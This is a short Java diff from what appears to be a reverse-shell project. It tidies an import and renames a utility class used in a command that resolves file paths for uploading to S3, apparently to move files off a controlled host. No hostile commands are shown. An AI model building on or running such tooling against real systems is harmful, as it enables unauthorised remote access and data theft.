@@ -1,6 +1,5 @@
 package com.mtattab.reverseshell.service.commands;
 
-import com.mtattab.reverseshell.model.CommandRestOutput;
 import com.mtattab.reverseshell.service.Command;
 import com.mtattab.reverseshell.util.*;
 
@@ -35,7 +34,7 @@ public class UploadToS3Command implements Command {
     }
 
     private File getDesiredFile(String path){
-        File relativeFile = new File(SystemCommandProxyUtil.currentWorkingDir, path);
+        File relativeFile = new File(SystemCommandUtil.currentWorkingDir, path);
         File absoluteFile = new File(path);
         File fileToUpload = null;
 
